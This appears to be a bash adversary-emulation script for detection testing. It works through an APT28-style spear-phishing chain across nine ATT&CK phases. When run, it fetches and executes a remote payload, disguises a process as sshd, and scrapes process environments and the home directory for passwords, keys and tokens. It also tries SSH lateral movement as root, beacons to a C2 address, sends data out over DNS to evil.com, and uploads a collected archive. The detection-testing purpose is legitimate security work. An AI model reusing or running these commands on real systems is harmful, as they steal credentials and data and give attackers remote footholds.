#!/bin/bash
#############################################################################
# Scenario 2: APT28 Spear Phishing to Lateral Movement Simulation
# 
# Based on: Democratic National Committee hack (2016)
# Complexity: High
# Techniques: 12 MITRE ATT&CK techniques
# Duration: ~25 minutes
#
# ⚠️ WARNING: Run ONLY on isolated test systems!
#############################################################################

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Configuration
ATTACK_NAME="APT28_SpearPhishing"
LOG_DIR="/tmp/apt_scenario2_logs"
C2_SERVER="203.0.113.50:443"  # Simulated C2 (TEST-NET-2)
MALWARE_DIR="/tmp/.system_updates"
EXFIL_DIR="/tmp/.cache_$RANDOM"
PIVOT_TARGET="192.168.1.100"

echo -e "${GREEN}[*] Starting Scenario 2: APT28 Spear Phishing Attack${NC}"
echo -e "${YELLOW}[!] This simulates a SOPHISTICATED multi-stage attack${NC}"
echo -e "${YELLOW}[!] Ensure auditd is running and system is isolated${NC}"
echo

# Setup
mkdir -p "$LOG_DIR" "$MALWARE_DIR" "$EXFIL_DIR"
START_TIME=$(date +%s)
echo "$START_TIME" > "$LOG_DIR/start_time.txt"
echo -e "${GREEN}[*] Attack start: $(date)${NC}\n"

sleep 2

#############################################################################
# Phase 1: Initial Access
#############################################################################
echo -e "${BLUE}=== Phase 1: Initial Access ===${NC}"

#############################################################################
# T1566.001 - Phishing: Spearphishing Attachment
#############################################################################
echo -e "${GREEN}[T1566.001]${NC} Simulating malicious PDF delivery..."
cat > "$MALWARE_DIR/invoice_Q4_2025.pdf" << 'EOF'
%PDF-1.4
Malicious payload embedded
<script>curl http://203.0.113.50/stage1.sh | bash</script>
EOF

cat > "$MALWARE_DIR/payload.sh" << 'EOF'
#!/bin/bash
# Stage 1 payload
curl -s http://203.0.113.50:443/stage2 -o /tmp/.system_updates/backdoor 2>/dev/null || true
chmod +x /tmp/.system_updates/backdoor 2>/dev/null
nohup /tmp/.system_updates/backdoor & 2>/dev/null
EOF
chmod +x "$MALWARE_DIR/payload.sh"

sleep 2

#############################################################################
# T1204.002 - User Execution: Malicious File
#############################################################################
echo -e "${GREEN}[T1204.002]${NC} Simulating user opening malicious PDF..."
# Simulate PDF reader opening file
bash "$MALWARE_DIR/payload.sh" 2>/dev/null || true

sleep 3

#############################################################################
# Phase 2: Persistence & Privilege Escalation
#############################################################################
echo -e "${BLUE}=== Phase 2: Persistence & Privilege Escalation ===${NC}"

#############################################################################
# T1053.003 - Scheduled Task/Job: Cron
#############################################################################
echo -e "${GREEN}[T1053.003]${NC} Establishing persistence via cron..."
cat > "$MALWARE_DIR/persist.sh" << 'EOF'
#!/bin/bash
# Persistence backdoor
if ! pgrep -f "system_monitor" > /dev/null; then
    /tmp/.system_updates/backdoor &
fi
EOF
chmod +x "$MALWARE_DIR/persist.sh"

# Simulate cron entry (logged but not installed)
echo "*/10 * * * * $MALWARE_DIR/persist.sh" > "$LOG_DIR/cron_persistence.txt"
echo -e "${YELLOW}[!] Cron persistence simulated${NC}"

sleep 2

#############################################################################
# T1068 - Exploitation for Privilege Escalation
#############################################################################
echo -e "${GREEN}[T1068]${NC} Simulating privilege escalation exploit..."
# Simulate CVE exploit attempt
cat > "$MALWARE_DIR/privesc.sh" << 'EOF'
#!/bin/bash
# Simulate privilege escalation (CVE-2021-3156: sudo vulnerability)
echo "Attempting sudo exploit..."
# In real attack, this would exploit vulnerability
sudo -l 2>/dev/null | head -5 > /tmp/.system_updates/sudo_info.txt || true
EOF
chmod +x "$MALWARE_DIR/privesc.sh"
bash "$MALWARE_DIR/privesc.sh" 2>/dev/null || true

sleep 2

#############################################################################
# Phase 3: Defense Evasion
#############################################################################
echo -e "${BLUE}=== Phase 3: Defense Evasion ===${NC}"

#############################################################################
# T1036.005 - Masquerading: Match Legitimate Name
#############################################################################
echo -e "${GREEN}[T1036.005]${NC} Creating process masquerading as sshd..."
# Copy bash to look like sshd
cp /bin/bash "$MALWARE_DIR/sshd" 2>/dev/null || true
cat > "$MALWARE_DIR/fake_sshd.sh" << 'EOF'
#!/bin/bash
# Masquerade as sshd
exec -a "sshd: root@notty" /bin/bash -c 'sleep 300' &
EOF
chmod +x "$MALWARE_DIR/fake_sshd.sh"
bash "$MALWARE_DIR/fake_sshd.sh" 2>/dev/null || true

sleep 2

#############################################################################
# T1003.001 - OS Credential Dumping: LSASS Memory
#############################################################################
echo -e "${GREEN}[T1003.001]${NC} Attempting credential dumping..."
# Simulate memory credential extraction
ps aux > "$EXFIL_DIR/process_list.txt"
cat /proc/*/environ 2>/dev/null | strings | grep -i "pass\|key\|token" | head -20 > "$EXFIL_DIR/creds_memory.txt" || echo "none" > "$EXFIL_DIR/creds_memory.txt"

# Search for credentials in common locations
find ~ -maxdepth 3 -type f -name "*password*" -o -name "*secret*" -o -name "*.pem" 2>/dev/null | head -10 > "$EXFIL_DIR/cred_files.txt" || true

sleep 2

#############################################################################
# Phase 4: Discovery
#############################################################################
echo -e "${BLUE}=== Phase 4: Discovery ===${NC}"

#############################################################################
# T1018 - Remote System Discovery
#############################################################################
echo -e "${GREEN}[T1018]${NC} Discovering network hosts..."
# Network reconnaissance
ping -c 1 192.168.1.1 2>/dev/null | head -5 > "$EXFIL_DIR/network_recon.txt" || echo "gateway unreachable" > "$EXFIL_DIR/network_recon.txt"

# ARP scan simulation
arp -a >> "$EXFIL_DIR/network_recon.txt" 2>/dev/null || ip neigh >> "$EXFIL_DIR/network_recon.txt"

# Port scanning simulation (nmap-like)
for port in 22 80 443 3389 445; do
    timeout 1 bash -c "echo >/dev/tcp/192.168.1.1/$port" 2>/dev/null && echo "Port $port open" >> "$EXFIL_DIR/portscan.txt" || true
done

sleep 3

#############################################################################
# Phase 5: Lateral Movement
#############################################################################
echo -e "${BLUE}=== Phase 5: Lateral Movement ===${NC}"

#############################################################################
# T1021.004 - Remote Services: SSH
#############################################################################
echo -e "${GREEN}[T1021.004]${NC} Attempting lateral movement via SSH..."
# Simulate SSH lateral movement
cat > "$MALWARE_DIR/lateral.sh" << 'EOF'
#!/bin/bash
# Try SSH to discovered hosts
ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 user@192.168.1.100 "whoami" 2>&1 | head -5
EOF
chmod +x "$MALWARE_DIR/lateral.sh"
bash "$MALWARE_DIR/lateral.sh" >> "$EXFIL_DIR/lateral_attempts.txt" 2>&1 || true

# Simulate credential reuse
for host in 192.168.1.{100..102}; do
    timeout 2 ssh -o ConnectTimeout=1 -o StrictHostKeyChecking=no root@$host "echo pivot" 2>&1 | head -1 >> "$EXFIL_DIR/pivot_attempts.txt" || true
done

sleep 3

#############################################################################
# Phase 6: Collection
#############################################################################
echo -e "${BLUE}=== Phase 6: Collection ===${NC}"

#############################################################################
# T1119 - Automated Collection
#############################################################################
echo -e "${GREEN}[T1119]${NC} Automated data collection..."
# Mass file collection
find ~ -maxdepth 3 -type f \( -name "*.doc" -o -name "*.docx" -o -name "*.pdf" -o -name "*.xls" -o -name "*.xlsx" \) -mtime -30 2>/dev/null | head -50 > "$EXFIL_DIR/target_docs.txt" || true

# Email searches (simulated)
find ~ -type f -name "*.eml" -o -name "*.msg" 2>/dev/null | head -20 > "$EXFIL_DIR/emails.txt" || true

# Browser data
find ~ -type f -path "*/.*/*history*" -o -path "*/.*/*cookie*" 2>/dev/null | head -10 > "$EXFIL_DIR/browser_data.txt" || true

# Archive collected data
tar -czf "$EXFIL_DIR/exfil_package.tar.gz" "$EXFIL_DIR/"*.txt 2>/dev/null || true

sleep 2

#############################################################################
# Phase 7: Command & Control
#############################################################################
echo -e "${BLUE}=== Phase 7: Command & Control ===${NC}"

#############################################################################
# T1071.001 - Application Layer Protocol: Web Protocols
#############################################################################
echo -e "${GREEN}[T1071.001]${NC} Establishing C2 over HTTPS..."
# Simulate HTTPS C2 beacon
curl -k -X POST https://$C2_SERVER/beacon \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
    -d "hostname=$(hostname)&user=$(whoami)" 2>/dev/null || echo -e "${YELLOW}[!] C2 unreachable (expected)${NC}"

# DNS tunneling simulation (for data exfil)
for i in {1..5}; do
    dig $(echo "data$i" | base64).evil.com @8.8.8.8 +short 2>/dev/null || true
done

sleep 2

#############################################################################
# Phase 8: Exfiltration
#############################################################################
echo -e "${BLUE}=== Phase 8: Exfiltration ===${NC}"

#############################################################################
# T1048.003 - Exfiltration Over Alternative Protocol
#############################################################################
echo -e "${GREEN}[T1048.003]${NC} Exfiltrating data via DNS tunneling..."
# Base64 encode and exfiltrate via DNS
if [ -f "$EXFIL_DIR/exfil_package.tar.gz" ]; then
    # Simulate chunked DNS exfil
    base64 "$EXFIL_DIR/exfil_package.tar.gz" | head -c 100 > "$EXFIL_DIR/chunk1.b64"
    CHUNK=$(cat "$EXFIL_DIR/chunk1.b64")
    dig ${CHUNK:0:30}.exfil.evil.com @8.8.8.8 +short 2>/dev/null || true
fi

# HTTP exfil (will fail but generate traffic)
curl -X POST -F "file=@$EXFIL_DIR/exfil_package.tar.gz" \
    http://$C2_SERVER/upload 2>/dev/null || true

sleep 2

#############################################################################
# Phase 9: Impact
#############################################################################
echo -e "${BLUE}=== Phase 9: Impact ===${NC}"

#############################################################################
# T1485 - Data Destruction
#############################################################################
echo -e "${GREEN}[T1485]${NC} Simulating wiper malware (SAFE MODE)..."
cat > "$MALWARE_DIR/wiper.sh" << 'EOF'
#!/bin/bash
# SAFE wiper simulation - only logs, doesn't actually delete
echo "$(date): Wiper would target:" > /tmp/apt_scenario2_logs/wiper_targets.txt
find /home -type f -name "*.doc" 2>/dev/null | head -20 >> /tmp/apt_scenario2_logs/wiper_targets.txt
echo "$(date): Wiper simulation complete (NO FILES DELETED)" >> /tmp/apt_scenario2_logs/wiper_targets.txt
EOF
chmod +x "$MALWARE_DIR/wiper.sh"
bash "$MALWARE_DIR/wiper.sh" 2>/dev/null || true

echo -e "${YELLOW}[!] Wiper executed in SAFE MODE (no actual deletion)${NC}"

sleep 2

#############################################################################
# Attack Completion
#############################################################################
END_TIME=$(date +%s)
DURATION=$((END_TIME - START_TIME))

echo
echo -e "${GREEN}[*] ===== Scenario 2 (APT28) Completed =====${NC}"
echo -e "${GREEN}[*] Duration: ${DURATION} seconds ($(($DURATION / 60)) minutes)${NC}"
echo -e "${GREEN}[*] Phases executed: 9${NC}"
echo -e "${GREEN}[*] Techniques demonstrated: 12${NC}"
echo

# Generate summary
cat > "$LOG_DIR/attack_summary.txt" << EOF
APT28 Spear Phishing Attack Simulation
========================================
Campaign: DNC-style Attack
Start: $(date -d @$START_TIME 2>/dev/null || date -r $START_TIME)
End: $(date)
Duration: ${DURATION} seconds ($(($DURATION / 60)) minutes)

Attack Phases:
1. Initial Access (Spear Phishing)
2. Persistence & Privilege Escalation
3. Defense Evasion
4. Discovery
5. Lateral Movement
6. Collection
7. Command & Control
8. Exfiltration
9. Impact

MITRE ATT&CK Techniques (12):
- T1566.001: Spearphishing Attachment
- T1204.002: User Execution
- T1053.003: Cron Persistence
- T1068: Privilege Escalation
- T1036.005: Process Masquerading
- T1003.001: Credential Dumping
- T1018: Network Discovery
- T1021.004: SSH Lateral Movement
- T1119: Automated Collection
- T1071.001: HTTPS C2
- T1048.003: DNS Exfiltration
- T1485: Data Destruction

Artifacts:
- Malware: $MALWARE_DIR
- Exfil: $EXFIL_DIR
- Logs: $LOG_DIR

Expected Detections:
- PDF with embedded payload
- Suspicious bash execution chains
- Process masquerading (fake sshd)
- Memory credential scanning
- Network reconnaissance
- SSH brute force attempts
- Mass file collection
- DNS tunneling patterns
- C2 beaconing
- Wiper execution

Detection Difficulty: HIGH
Recommended Actions: Review all logs, check for lateral movement, analyze network traffic

Cleanup: bash experiments/scenarios/cleanup.sh
EOF

cat "$LOG_DIR/attack_summary.txt"

echo
echo -e "${YELLOW}[!] CRITICAL: Run cleanup immediately${NC}"
echo -e "${YELLOW}[!] Check for: processes, cron, /tmp artifacts${NC}"
echo -e "${YELLOW}[!] Command: bash experiments/scenarios/cleanup.sh${NC}"
echo
